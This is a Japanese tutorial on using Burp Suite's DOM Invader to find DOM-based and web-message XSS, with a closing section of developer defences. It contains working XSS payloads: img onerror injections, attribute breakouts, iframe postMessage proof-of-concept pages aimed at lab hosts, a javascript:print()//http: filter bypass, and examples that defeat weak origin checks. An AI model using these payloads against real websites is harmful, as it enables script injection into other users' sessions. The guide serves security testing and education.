DOM ベース XSS（クライアント側の JavaScript が、攻撃者の制御可能なデータを危険な代入先へ渡してしまうことで起きる XSS）は、反射型・格納型の XSS と違って「サーバのレスポンス HTML を見ても脆弱性が見えない」という厄介な性質を持つ。攻撃の全過程がブラウザ内の JavaScript 実行中に起きるためだ。

手作業で DOM ベース XSS を探す場合、テスターは次の 2 点を追わなければならない。

- **source（ソース／入力の入口）**: 攻撃者が値を注入できる場所。例: `location.search`（URL のクエリ文字列）、`location.hash`（URL の `#` 以降のフラグメント）、`document.referrer`、`window.name`、`postMessage()` で受け取る web message など。
- **sink（シンク／危険な出口）**: そのユーザー入力が最終的に実行・解釈される危険な代入先。例: `element.innerHTML`（HTML として解釈される）、`eval()`（JavaScript として実行される）、`document.write()`、`location.href`（`javascript:` URL を実行しうる）など。

問題は、source から sink までのデータの流れ（データフロー）が、しばしば**数千行に及ぶ難読化・ミニファイ（minify: 変数名を短縮し空白を除去した圧縮）された JavaScript の中を、複数の関数呼び出しをまたいで**通ることだ。これを人間が目視で追い切るのは現実的でない。

DOM Invader はこの「データフロー追跡」を自動化する。仕組みの核心は **canary（カナリア）** と呼ばれる目印文字列である。canary を source に注入し、ブラウザが実際にコードを実行した結果、その canary が**どの sink に到達したか**を DOM Invader が横取りして一覧表示する。これにより、あたかも反射型 XSS を探すかのように「入れた値がどこに出たか」を直接観察できる。ソースコードを一行ずつ読む必要がなくなる、というのが DOM Invader の中心的価値である。

> 出典: Testing for DOM XSS — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-xss
> 出典: Introducing DOM Invader: DOM XSS just got a whole lot easier to find — https://portswigger.net/blog/introducing-dom-invader

補足として、DOM Invader は **2020 年に公開**された比較的新しいツールであり、当初の DOM XSS 検出に加え、その後のバージョンで **web message 経由の検出**、**クライアント側 prototype pollution（プロトタイプ汚染）** や **DOM clobbering（DOM クロバリング）** の検出機能が順次追加されてきた。バージョンによって利用できる機能・UI が異なる点に注意すること。

---

### DOM Invader とは何か（機能全体像）

DOM Invader は、Burp Suite に**内蔵されたブラウザ（built-in browser、Chromium ベース）専用の拡張機能**として最初からインストールされている、ブラウザ内で動作する DOM XSS テストツールである。外部のブラウザには入れられず、Burp の内蔵ブラウザからのみ利用できる点が特徴だ。DOM Invader は多様な source と sink を対象に DOM XSS を検出し、web message ベクトルと prototype pollution ベクトルの両方にも対応する。

主要な機能は次のとおり。

- **Augmented DOM（拡張 DOM ビュー）**
  ブラウザの開発者ツール（DevTools）に DOM Invader 専用タブを追加し、ターゲット内に存在するすべての source と sink を一覧表示する。通常の DOM ツリー表示に、DOM Invader が検出した「ここは source」「ここは sink」という注釈（augment）を重ねて見せてくれる。興味のある sink を見つけたら、そこに渡された値（Value）と、その値が渡された経路を示す **stack trace（スタックトレース: 関数呼び出しの履歴）** を確認でき、canary をハイライト表示してくれる。反射型 XSS を探すのと同じ感覚で「sink に流れ込んだ値」を検査できる。

- **web message のテスト**
  ページ上で `postMessage()` により送受信される web message をすべてログに記録する。さらに、Burp Repeater で HTTP リクエストを改変・再送するのと同じように、**web message を改変して再送**できる。これにより、web message を source とする DOM XSS を手軽に探索できる。手動での改変・再送に加え、DOM Invader が**自動で web message を改変・送信**して脆弱性を探す機能もある。

- **自動プロービング（自動探索）**
  既定では、通常の DOM XSS の source と sink を自動的に探索する。設定を有効にすると、それに加えて**クライアント側 prototype pollution の source を自動的に特定**しようとする。

- **prototype pollution / DOM clobbering の検出**
  攻撃タイプを追加で有効化することで、`Object.prototype` に任意のプロパティを追加できてしまう prototype pollution の source と、それを悪用できる gadget（ガジェット: 汚染したプロパティを読み取って危険な動作をするコード片）を自動走査したり、DOM clobbering（HTML 要素の `id`/`name` 属性でグローバル変数を上書きし、JavaScript の変数参照を乗っ取る攻撃）を自動検出したりできる。

- **高い設定自由度**
  サイトごと・用途ごとに挙動を細かく調整できる。既定でオフの機能が多いのは、canary 注入やイベント自動発火などがターゲットサイトの通常動作を壊してしまい、他のテストを妨げる場合があるためである。

> 出典: DOM Invader — https://portswigger.net/burp/documentation/desktop/tools/dom-invader
> 出典: Testing for DOM XSS — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-xss

---

### 有効化と基本設定

#### DOM Invader を有効にする

DOM Invader は内蔵ブラウザにプリインストールされているが、**既定では無効**になっている（前述のとおり、一部機能が他のテストを妨げうるため）。有効化の手順は次のとおり。

1. Burp の **Proxy > Intercept** タブを開き、そこから Burp の**内蔵ブラウザ（Burp's browser）を起動**する。
2. ブラウザウィンドウの**右上にある Burp Suite のロゴ**をクリックする。パネルが開き、「Burp Suite Navigation Recorder」と「DOM Invader」の設定タブが表示される。
3. **DOM Invader タブ**に切り替え、トグルスイッチを **On** にする。
4. **Reload（再読み込み）** をクリックしてブラウザを更新する。設定を反映させるにはこの再読み込みが必須である。

設定メニューへは、いつでも右上の Burp Suite ロゴをクリック → DOM Invader タブ、で戻れる。

> なぜ再読み込みが必要か: DOM Invader はページの JavaScript 実行環境に自身のフック（source/sink になりうる関数を横取りする仕掛け）を仕込む。この仕込みはページが読み込まれる**前**に注入される必要があるため、設定変更後は必ずページを再読み込みして、フックが効いた状態でスクリプトを走らせ直す必要がある。

#### canary の設定

設定メニューの下部に、DOM Invader が現在追跡している canary 文字列（ランダム生成された英数字列）が表示される。この canary は**任意の独自文字列に置き換え可能**であり、自分で決めた覚えやすい・ぶつかりにくい文字列を追跡させることもできる。

> canary を変更したいケース: 既定のランダム文字列がたまたまページ内の別の文字列と衝突して誤検出を招く場合や、複数のパラメータの流れを人間側でも区別したい場合に、独自 canary が役立つ。

#### Misc（その他）設定 — 挙動を左右する重要オプション

Misc セクションでは、テストの精度と副作用に直結する次のようなオプションを制御できる。

- **source への canary 自動注入（Auto inject canary in sources）**
  有効にすると、ページ上で特定された source すべてに canary を自動的に注入する。しかもソースごとに canary の末尾へ**固有の文字列を付け足す**ため、「どの source が、どの sink に流れ込んだか」を一目で対応付けられる。
  > 仕組み上の利点: 単一の canary だと複数の source が同じ sink に合流したときに区別できないが、source ごとに末尾を変えることで sink 側に現れた文字列を見るだけで発生元を逆引きできる。

- **重複スタックトレースの非表示（Hide duplicate stack traces）**
  有効にすると、各エントリのスタックトレースを比較し、コード上の**同じ場所**を指す重複エントリを隠す。ノイズを減らして本質的な sink に集中できる。

- **イベントの自動発火（Auto-fire events）**
  有効にすると、ページ読み込み直後に**すべての要素に対して `click` と `mouseover` イベントを自動発火**する。ユーザー操作を起点に初めて実行される（＝操作しないと現れない）source/sink を炙り出すのに有効。
  > 副作用に注意: 全要素をクリック・マウスオーバーするため、リンク遷移やフォーム送信など望まぬ動作を誘発することがある。テスト対象を壊しうる操作なので、必要なときだけ使う。

- **リダイレクトの防止（Redirection prevention）**
  有効にすると、クライアント側リダイレクト（JavaScript による `location` 変更などのページ遷移）を**ブロックして同じページに留まる**。ただし例外として、`javascript:` URL への遷移や、後述の **Inject URL ボタン**が起こす遷移は通常どおり動く。
  > なぜ必要か: DOM XSS のテスト中に対象コードが別ページへ飛ばしてしまうと、sink の観察が中断される。留まることで腰を据えて検証できる。`javascript:` を例外にしているのは、それ自体が実行される sink の検証に不可欠だからである。

#### 攻撃タイプ（Attack types）の有効化

Attack types セクションで、既定の DOM XSS 検出に加えて追加の攻撃探索を有効化できる。

- **Prototype pollution（プロトタイプ汚染）**: トグルを On にして Reload すると、`Object.prototype` に任意プロパティを追加できる source をページから自動チェックする。DOM Invader は複数の汚染テクニックを使うが、**すべてを同時に使うとサイトによっては攻撃が成立しなくなる**ことがあるため、一部を無効化する・一度に 1 テクニックだけ使う、といった調整が推奨される。
- **DOM clobbering**: トグルを On にすると DOM clobbering 脆弱性を自動特定しようとする。ターゲットサイトの機能を壊す可能性があるため、**既定では無効**になっている。

> 出典: Enabling DOM Invader — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling
> 出典: DOM Invader canary settings — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/canary
> 出典: Miscellaneous DOM Invader settings — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/misc
> 出典: DOM Invader attack types — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/attack-types

---

### DOM ベース XSS の検出手順（source → sink）

ここが DOM Invader の中核機能である。標準的な source（URL パラメータやフォーム入力など）が sink に流れ込んで XSS になるケースを検出する流れを、原理とともに追う。

#### canary の仕組み — なぜ「入れた値がどこに出たか」が分かるのか

DOM Invader は、canary（他とぶつかりにくい、任意の英数字列。「目印」）を source に注入し、ページの JavaScript が実際に実行された結果、その canary が **DOM のどこに・どの sink 関数へ**現れたかを監視する。DOM Invader は DOM を自動的に解析し、あらかじめ定めた canary 文字列の出現箇所を探し出す。

> 原理: DOM Invader は `innerHTML`、`eval`、`document.write`、`location` 代入などの「危険な代入先＝sink になりうる操作」をあらかじめ**フック（横取り）**している。フックされた関数に値が渡されるたびに、その値の中に canary が含まれていれば「source に入れた文字列がここまで到達した」と判定できる。人間がデータフローを追う代わりに、ブラウザの実行そのものに語らせるアプローチである。

#### 基本ワークフロー

1. **canary をコピーする**: DOM Invader タブを選び、**Copy canary（カナリアをコピー）** をクリックする。
2. **canary を source に注入する**: 疑わしい source（URL のクエリパラメータ、`#` フラグメント、フォーム入力欄など）に canary を貼り付ける。
3. **制御可能な sink を特定する**: DOM ビュー（Augmented DOM）に現れる sink の一覧から、canary が到達した sink を探す。
4. **XSS コンテキストを判定する**: sink エントリの **Value 列**を見て、canary が「どんな文脈」で出力されているかを読み取る。属性値の中なのか、タグの外なのか、`<script>` 内なのか、`javascript:` URL としてなのか、で必要なエスケープ・突破手法が変わる。
5. **エクスプロイトを組み立てる**: 判定した XSS コンテキストに合わせた文字列を source に入れ直し、実際に実行できるか（例: `alert()` や `print()` が発火するか）を確認する。

#### sink 詳細ビューで得られる情報

興味深い sink を見つけると、DOM Invader はその sink に入った値と、そこへ至る**スタックトレース**を表示し、canary をハイライトしてくれる。sink の種類に応じて、次のような詳細も確認できる。

- **Outer HTML**: canary を囲んでいる HTML 要素。どのタグ・属性の内側に出力されているかが分かる（＝どこを閉じてブレイクアウトすべきかが分かる）。
- **Frame path**: canary が sink に渡された際の**フレーム（iframe など）のパス**。どのドキュメント内で起きているかを示す。
- **Event**: canary が sink に渡されるきっかけとなった JavaScript の**イベント**（例: クリック時に発火する処理など）。

これらの情報から、XSS コンテキストと、エクスプロイトに必要な文字（`<`, `>`, `"` など）やイベントを容易に判別できる。

#### テストを加速する自動機能

- **Inject URL params（URL パラメータへの自動注入）**: URL のすべてのクエリパラメータに canary を自動注入する。しかも**パラメータごとに別タブ**を使って注入するため、どのパラメータが sink に届くかを個別に確認できる。
- **Inject forms（フォームへの自動注入）**: ページ上で検出された HTML フォームの入力欄すべてに canary を自動注入する。
- **sink に送られた値の検索**: sink へ渡された値の中から特定文字列を検索できる。
- **canary の source 自動注入**（前述の Misc 設定）: source ごとに固有末尾を付けて注入し、発生元を逆引きしやすくする。

#### 実行と PoC 生成（Exploit / Build PoC）

DOM Invader は、確認した脆弱性から**動作するエクスプロイト（概念実証: PoC）をボタン一つで生成**できる。sink の隣にある **Exploit** ボタンや **Build PoC** ボタンを押すと、source・（prototype pollution の場合は）gadget・sink を組み合わせた PoC が生成され、クリップボードにコピーされる。とくに prototype pollution では、DOM Invader が gadget を見つけると、source＋gadget＋sink を自動連結して XSS を確定させる PoC を自動生成できる。

#### 具体例で理解する

たとえば URL に `?search=<canary>` の形で canary を注入したところ、DOM ビューに `innerHTML` sink が現れ、Value 列でその canary が次のように `<div>` 内へそのまま出力されていたとする。

```html
<div id="results">canary文字列</div>
```

これは canary が HTML 要素の**中身（要素コンテンツ）としてそのまま解釈されている**ことを意味する。属性の内側でもスクリプト内でもないため、新しいタグを直接注入できる。そこで source（`search` パラメータ）に次を入れる。

```html
<img src=1 onerror=alert(document.domain)>
```

これが動く理由: `innerHTML` に代入された文字列はブラウザの HTML パーサによって**その場で HTML として再解釈**される。`<img>` の `src=1` は必ず読み込みに失敗するため、失敗時に発火する `onerror` イベントハンドラの JavaScript が実行される。`<script>` タグは `innerHTML` 経由では（仕様上）実行されないため、代わりにイベントハンドラ属性を持つ要素（`img`/`svg` など）を使うのが定石である。

もし Value 列で canary が二重引用符属性の内側（例: `<input value="canary文字列">`）に出ていたなら、まず属性を閉じてタグをブレイクアウトする必要がある。

```html
"><img src=1 onerror=alert(1)>
```

これが動く理由: 先頭の `">` で、開いていた `value="..."` 属性と `<input` タグを閉じ、直後に新しい `<img>` 要素を注入している。属性コンテキストからタグコンテキストへ「脱出（ブレイクアウト）」してから攻撃タグを置く、という XSS の基本手筋である。

> 出典: Testing for DOM XSS — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-xss
> 出典: Testing for DOM XSS with DOM Invader — https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/dom-xss
> 出典: Introducing DOM Invader — https://portswigger.net/blog/introducing-dom-invader

---

### web message 経由の DOM ベース XSS の検出

DOM Invader の真価がとくに発揮されるのが、**web message（ウェブメッセージ）** を source とする DOM XSS の検出である。これは手作業では非常に見つけにくいため、専用機能の恩恵が大きい。

#### 前提: postMessage と web message の仕組み

`postMessage()` は、**異なるオリジン（プロトコル＋ホスト＋ポートの組。例: `https://a.example` と `https://b.example` は別オリジン）に属するウィンドウ／iframe 同士が、安全に文字列データをやり取りするためのブラウザ API** である。送信側は次のように書く。

```javascript
// 送信側: targetWindow へメッセージを送る
targetWindow.postMessage(data, targetOrigin);
```

受信側は `message` イベントを購読して受け取る。

```javascript
// 受信側: 届いたメッセージを処理する
window.addEventListener('message', function(e) {
  // e.data   … 送られてきたデータ本体
  // e.origin … 送信元のオリジン
  // e.source … 送信元の window オブジェクトへの参照
});
```

受信側イベントオブジェクトの主要プロパティは 3 つ。

- **`e.data`**: メッセージ本体（攻撃者が仕込むペイロードの置き場）。
- **`e.origin`**: メッセージの送信元オリジン。**本来はここを厳密に検証して、信頼できる送信元からのメッセージだけを処理すべき**。
- **`e.source`**: 送信元 window への参照（多くは iframe）。

#### 脆弱性の成立条件

**web message DOM XSS は、受信側（destination origin）が「送信側は悪意あるデータを送ってこない」と信頼してしまい、受け取ったデータを危険な sink へ安全でない形で渡すときに発生する。** 典型的には、`e.origin` を検証せず（あるいは検証が不完全なまま）、`e.data` を `innerHTML` や `eval`、`location.href` などへ流し込むコードが該当する。

最も素朴で危険なパターンはこれだ。

```javascript
window.addEventListener('message', function(e) {
  eval(e.data);   // 送られてきた文字列をそのまま JavaScript として実行
});
```

これが危険な理由: `e.origin` を一切見ずに `e.data` を `eval()` に渡している。攻撃者が任意のページから（あるいは被害者に開かせた iframe から）このウィンドウへ `postMessage('alert(1)', '*')` を送れば、その文字列が JavaScript として実行される。攻撃者は次のような**攻撃ページ**を用意し、被害者に開かせるだけでよい。

```html
<iframe src="https://victim.example/" onload="this.contentWindow.postMessage('print()','*')"></iframe>
```

これが動く理由: iframe に被害サイトを読み込み、`onload`（読み込み完了時）に、その iframe の中身（`contentWindow`）へ向けて web message を送っている。第 2 引数の `'*'`（targetOrigin）は「どのオリジンでも受け取ってよい」の意で、攻撃者側から送るときに送信先を限定しない指定である。受信側が origin を検証していないため、外部から送ったメッセージがそのまま `eval` される。

#### message event のプロパティから脆弱性を読む

DOM Invader の Messages ビューでは、記録された各メッセージについて、**クライアント側 JavaScript が `origin`／`data`／`source` の各プロパティに実際にアクセスしたかどうか**を確認できる。これが強力な手がかりになる。

- **`origin` にアクセスしていない** → 送信元オリジンを検証していない可能性が高い（＝どこからでも送り込める）。
- **`data` にアクセスしていない** → データが一切使われていないので、そのメッセージは**悪用できない**（sink へ渡りようがない）。
- **`source` にアクセスしていない** → 送信元（多くは iframe）を検証していない可能性が高い。

この 3 点を見るだけで、「このメッセージは攻略できるか、どう攻めるか」の当たりを素早く付けられる。

#### DOM Invader の web message 機能

DOM Invader は web message テストのために次を提供する。

- ページ上で `postMessage()` により送られた web message を**すべてログに記録**する（付随情報つき）。
- Burp Repeater のように、web message を**改変して再送**し、手動で DOM XSS を探れる。
- DOM Invader が**自動でメッセージを改変・送信**して、代わりに DOM XSS を探ってくれる。
- 観測された挙動に基づき、DOM Invader は**悪用可能と判断したメッセージに推定 Severity（深刻度）と Confidence（確信度）を表示**して自動フラグ付けする。自動検出しきれない脆弱性を含む可能性を考慮し、ページ上で送られた**すべてのメッセージが少なくとも Information（情報）深刻度で一覧される**。

#### origin 検証の不備を自動で炙り出す仕組み（重要）

多くの実装は origin を検証しているつもりでも、検証ロジックが甘い。DOM Invader はこの甘さを自動で突く。**DOM Invader は、送るメッセージの origin を「本物のオリジンのドメイン名で始まり、かつ同じドメイン名で終わる」偽オリジンに自動で置き換える**。これにより、`indexOf`／`startsWith`／`endsWith` や正規表現による**不完全な origin 検証に依存したイベントハンドラを自動的に特定**できる。

代表的な検証不備と、その突破例を示す。

```javascript
// 不備例1: 部分一致（含まれていればOK）にしてしまっている
window.addEventListener('message', function(e) {
  if (e.origin.indexOf('normal-website.com') !== -1) {
    // 信頼して処理してしまう
  }
});
```

突破される理由: `indexOf` は「文字列のどこかに含まれるか」しか見ない。攻撃者のオリジンが `http://www.normal-website.com.evil.net` であれば、その中に `normal-website.com` という部分文字列が**含まれてしまう**ため、検証を通過する。ドメインは実際には攻撃者の `evil.net` 配下である。

```javascript
// 不備例2: 前方一致だけ／後方一致だけを見ている
if (e.origin.startsWith('https://normal-website.com')) { /* ... */ }  // 前方一致のみ
if (e.origin.endsWith('normal-website.com')) { /* ... */ }           // 後方一致のみ
```

突破される理由: `startsWith` は `https://normal-website.com.evil.net` のような「本物で始まるが別ドメイン」に騙され、`endsWith` は `https://evil-normal-website.com` のような「本物で終わるが別ドメイン」に騙される。DOM Invader が偽オリジンを「本物で始まり本物で終わる」形に作るのは、まさにこの両パターンを同時に検出するためである。正しい検証は**完全一致（`e.origin === 'https://normal-website.com'`）**でなければならない。

#### 手動テストと PoC 生成

Messages ビューから任意のメッセージをクリックすると詳細ダイアログが開く。メッセージ情報を確認して**データが最終的にどの sink に入るか（sink の種類）**を見極め、**Data フィールドを sink の種類に合ったエクスプロイトに書き換えて Send（送信）** する。`<`, `>`, `"` などがエスケープされるかを試し、エスケープされないなら、それらを使って概念実証ペイロードを組み立てて送る。

脆弱なイベントリスナーを見つけ、Data ボックスでエクスプロイトを組み立てられたら、**Build PoC（PoC 生成）ボタン**を押すだけで、レポートに添付できる HTML の概念実証がクリップボードにコピーされる。

#### 具体例1: innerHTML に流し込むリスナー

受信したメッセージ本体をそのまま `innerHTML` へ入れているケース（例: `ads` という ID の `<div>` に広告 HTML として挿入する実装）。

```javascript
window.addEventListener('message', function(e) {
  document.getElementById('ads').innerHTML = e.data;  // origin 検証なし
});
```

攻撃ページ（PoC）:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
        onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"></iframe>
```

動く理由: origin を検証していないため外部から送ったメッセージが処理され、その文字列が `innerHTML` に代入されて HTML として再解釈される。`<img src=1 onerror=print()>` は画像読み込みに失敗して `onerror` が発火し、`print()` が実行される（ラボでは `print()` の実行が解答条件として使われる）。

#### 具体例2: JSON.parse を挟むリスナー

メッセージを JSON として解釈し、`type` プロパティで処理を分岐、`load-channel` の場合に iframe の `src`（あるいは `location.href`）を書き換える実装。

```javascript
window.addEventListener('message', function(e) {
  var data = JSON.parse(e.data);
  switch (data.type) {
    case 'load-channel':
      document.getElementById('ifr').src = data.url;  // url が location/href 系 sink に流れる
      break;
  }
});
```

攻撃ページ（PoC）:

```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/
  onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
</iframe>
```

動く理由: 送るデータを JSON 文字列にして `type` を `load-channel` に合わせ、`url` に `javascript:print()` を指定している。受信側はこれを `src`／`location.href` 系の sink に渡すため、`javascript:` URL が実行される。`location.href = 'javascript:...'` や `iframe.src = 'javascript:...'` は URL を JavaScript として実行しうる、という点が sink たるゆえんである。

#### 具体例3: 不完全な origin/内容検証を突く JavaScript URL

`e.data` の中に `http:` または `https:` が含まれるかを `indexOf` で確認し、含まれていれば安全とみなして `location` に渡してしまう実装。

```javascript
window.addEventListener('message', function(e) {
  if (e.data.indexOf('http:') > -1 || e.data.indexOf('https:') > -1) {
    location.href = e.data;   // http/https が含まれていれば通してしまう
  }
});
```

突破ペイロード（Data に入れて送る値）:

```
javascript:print()//http:
```

動く理由: 検証は「`http:` という文字列が含まれるか」しか見ていない。末尾に `//http:` を付ければこの部分一致チェックを通過する。一方 `//` 以降は JavaScript の行コメントとして無視されるため、実際に実行されるのは先頭の `javascript:print()` だけである。「検証を満たす無害な文字列」と「実行される悪意ある文字列」を 1 行に共存させる、DOM XSS 頻出のテクニックである。

> 出典: Testing for DOM XSS using web messages — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages
> 出典: Testing for web message DOM XSS with DOM Invader — https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/web-message-dom-xss
> 出典: Controlling the web message source（Web Security Academy） — https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
> 出典: Web message manipulation（Web Security Academy） — https://portswigger.net/web-security/dom-based/web-message-manipulation

---

### 実践ワークフローのまとめ（チェックリスト）

DOM Invader を使った DOM XSS テストの一連の流れを、実務で使える順序でまとめる。

1. **有効化**: Proxy > Intercept から内蔵ブラウザを起動 → 右上ロゴ → DOM Invader タブでトグル On → Reload。
2. **目的に応じた設定**:
   - 反射型ライクな DOM XSS を広く探すなら、Misc の「source への canary 自動注入」を On。
   - 操作起点の source を炙るなら「Auto-fire events」を On（副作用に注意）。
   - 遷移で観察が中断するなら「Redirection prevention」を On。
   - prototype pollution / DOM clobbering を探すなら Attack types で該当トグルを On（1 テクニックずつが安全）。
3. **標準 source のテスト**: Copy canary → URL パラメータ／フラグメント／フォームへ注入（`Inject URL params`／`Inject forms` で自動化）。
4. **sink の確認**: Augmented DOM の sink 一覧で canary の到達先を確認。Value 列で XSS コンテキストを判定。Outer HTML／Frame path／Event とスタックトレースで文脈を精査。
5. **web message のテスト**: Messages ビューでログを確認。`origin`／`data`／`source` のアクセス有無から攻略可否を判断。Data を書き換えて Send、または自動送信に任せる。origin 検証不備は偽オリジン自動置換が検出。
6. **エクスプロイト確定**: コンテキストに合ったペイロードで `alert`／`print` を発火。
7. **PoC 生成**: Exploit／Build PoC ボタンで PoC をクリップボードへ。レポートに添付。

---

### 防御策（開発者向けの原則）

DOM Invader は攻撃者・テスター側の道具だが、検出される脆弱性を作らないための防御原則も押さえておく。

- **危険な sink を避ける**: ユーザー制御データを `innerHTML`・`document.write`・`eval`・`location`／`href` 代入・`setTimeout(文字列)` などへ渡さない。HTML を組み立てる必要があるなら `textContent` を使う、あるいは `element.setAttribute` で属性値として安全に設定する。動的な HTML 挿入がどうしても必要なら、実績あるサニタイズライブラリ（例: **DOMPurify**）を使う。
  > バージョン注意: サニタイザにも既知のバイパスが定期的に見つかる。たとえば **DOMPurify は 2.0.17 未満**に mXSS（mutation XSS: ブラウザの HTML 再解析でサニタイズ後に危険化する攻撃）のバイパスが存在し修正済みである。ライブラリは必ず最新に保ち、公開年・修正状況を追うこと。
- **web message の origin を完全一致で検証する**: `e.origin === 'https://trusted.example'` のように厳密比較する。`indexOf`／`startsWith`／`endsWith`／緩い正規表現は前掲のとおり突破される。
- **送信側は targetOrigin を明示する**: `postMessage(data, 'https://trusted.example')` のように送信先オリジンを限定し、`'*'` を避ける（機密データが第三者フレームへ漏れるのを防ぐ）。
- **受信データをそのまま実行・挿入しない**: `JSON.parse` で構造化し、期待するスキーマ・値だけを許可（許可リスト方式）してから使う。
- **多層防御として CSP（Content Security Policy）を導入する**: インライン `<script>` やイベントハンドラ属性の実行を禁止し（`script-src` からインラインを排除、`unsafe-inline` を付けない）、`javascript:` の実行も抑止する。CSP はブラウザが**ソース許可リストを評価**して許可されないスクリプト実行をブロックする仕組みで、XSS が混入しても被害を軽減する最後の砦になる。

> 出典: DOM Invader — https://portswigger.net/burp/documentation/desktop/tools/dom-invader
> 出典: Testing for DOM XSS — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-xss
> 出典: Testing for web message DOM XSS with DOM Invader — https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/web-message-dom-xss

---

## DOM Invader補足（HackTricks / Medium）

本セクションは、第3章で導入した **DOM Invader**（Burp Suite に組み込まれた DOMベースXSS 発見支援ツール）を、より実務的・網羅的に掘り下げる補足です。典拠は次の2資料です。

1. **HackTricks の DOM Invader 解説** — ツールの機能を「攻撃者目線の手順書」として簡潔に列挙した実務系リファレンス。
2. **Hacksheets（Medium）の実践記事**「DOM Invader — Burp Suite tool to Find DOM Based XSS Easily」 — スクリーンショット付きで「有効化 → カナリア注入 → シンク確認」という基本ワークフローを初学者向けに追体験させる入門記事。

第3章前半（PortSwigger 系）で **source/sink（ソース/シンク）** の理論と DOM Invader の全体像は説明済みなので、本セクションでは重複を避け、(1) 各機能の**具体的な操作とボタンの挙動**、(2) プロトタイプ汚染・DOM クロバリング・postMessage といった**高度な攻撃タイプの検出メカニズム**、(3) 「なぜその手法で脆弱性が見つかる/成立するのか」という**原理**、を原文なしで理解できるレベルまで詳述します。

---

### 0. 本セクションの資料取得状況（透明性のための注記）

- **資料1（HackTricks）** は、執筆環境の下り（egress）プロキシが `hacktricks.wiki` ドメインへの直接アクセスをブロックしたため WebFetch では取得できませんでしたが、**HackTricks の公開ソース（GitHub 上の同一原稿ファイル）から本文全文を復元**できました。したがって本セクションでは資料1を「取得可能」として扱い、原典URLを出典に明記します。内容は原稿に忠実ですが、HackTricks は随時更新されるため細部は原典でご確認ください。
- **資料2（Hacksheets / Medium）** は、`hacksheets.medium.com` および既知のミラー（Tumblr 版、Medium リーダー系ミラー）がいずれもプロキシによりブロック／名前解決不能で、**記事本文そのものは取得できませんでした**。Web検索のスニペットから記事の骨子（扱っているトピックと手順の概要）は把握できたため、該当箇所に後述の未取得ブロックを挿入したうえで、専門知識で補って解説します。

---

### 1. DOM Invader とは何か（位置づけと「解決する課題」の再確認）

**DOM Invader** は、Burp Suite に内蔵された **組み込みブラウザ（Burp's embedded browser: Chromium ベースのブラウザで、Burp のプロキシを最初から経由するよう設定済み）** に、拡張機能としてあらかじめインストールされているツールです。目的は **DOMベースXSS を中心としたクライアント側脆弱性（DOM XSS・Webメッセージ XSS・プロトタイプ汚染・DOM クロバリング）を、JavaScript を手で追わずに発見する**ことです。

なぜ専用ツールが要るのか。DOMベースXSS の判定には、**「攻撃者が操作できる入口（source）」から「危険な代入先（sink）」まで、データがどう流れるか**を追う必要があります。ところが現代のフロントエンドは、圧縮（minify）・難読化された数千〜数万行の JavaScript でできており、この**データフロー（データの流れ）を人間が目で追うのは現実的でない**ことが多い。DOM Invader は、ブラウザ内部の危険な関数・プロパティ（`innerHTML` への代入、`eval()` の呼び出しなど）に**フック（hook: 対象の処理を横取りして、その引数や呼び出しを監視・記録する仕組み）** を仕掛け、「印を付けた入力（後述のカナリア）が、どのシンクに、どんな文脈で到達したか」を自動で報告します。

> HackTricks の要約: DOM Invader は「様々な source と sink を用いて DOM XSS をテストするブラウザ組み込みツール」で、Webメッセージやプロトタイプ汚染ベクタも扱える。Burp の組み込みブラウザ経由でのみ利用でき、拡張として preinstall されている。

> 出典: DOM Invader — HackTricks — https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-invader.html

#### 1.1 サーバ側スキャナでは見つからない理由（原理）

反射型・格納型 XSS は攻撃文字列がサーバを通るため、プロキシ（Burp Scanner など）がリクエスト/レスポンスを観測して検出できます。しかし DOMベースXSS のペイロードは、URL のフラグメント（`#` 以降）や `postMessage`、`localStorage` などを経由して**ブラウザ内で完結し、サーバに届かないことがある**。したがってネットワークを覗くだけのスキャナには原理的に見えません。DOM Invader が「ブラウザの中」で計測するのは、この盲点をふさぐためです。

---

### 2. 有効化と基本操作

HackTricks と一般的な手順に基づく、最小の起動フローは次のとおりです。

1. Burp Suite で **Proxy → Intercept → Open Browser**（または「Open Browser」ボタン）を押し、**Burp 組み込みブラウザ**を開く。
2. ブラウザ右上の **Burp Suite ロゴ（拡張アイコン）** をクリック（隠れている場合はジグソーピースの拡張アイコンを先に押す）。
3. **DOM Invader タブ**で「**Enable DOM Invader**」をオンにし、ページを**リロード**する（フックはページ読み込み時に仕掛けられるため、有効化後の再読み込みが必須）。
4. **DevTools（F12）** を開くと、DevTools パネルに **DOM Invader 用のタブ**（および後述の「**Augmented DOM**」タブ）が追加される。

> ポイント: DOM Invader は「Burp の組み込みブラウザ限定」です。普段使いの Chrome/Firefox には拡張として入れられません（計測フックを安全に注入するために専用ブラウザに限定されている）。

> 出典: DOM Invader — HackTricks — https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-invader.html

---

### 3. Canary（カナリア）— DOM Invader の中核

**カナリア（canary）** とは、DOM Invader が「入力の追跡用マーカー」として使う**一意のランダム文字列**です（**デフォルト値は `burpdomxss`**）。炭鉱のカナリア（危険を知らせる小鳥）が語源で、「この文字列が危険な場所に現れたら警報」という発想です。仕組みはシンプルかつ強力です。

- あなた（またはツール）がカナリアを **source に注入**する（URL パラメータ、フォーム、WebSocket フレーム、Webメッセージなど）。
- DOM Invader は、フックした各シンクに渡る値の中に**カナリア文字列が含まれていないか**を監視する。
- カナリアがシンクに到達したら、**どのシンクに・どんな文脈（context）で・どんなサニタイズ（無害化処理）を経て**届いたかを報告する。

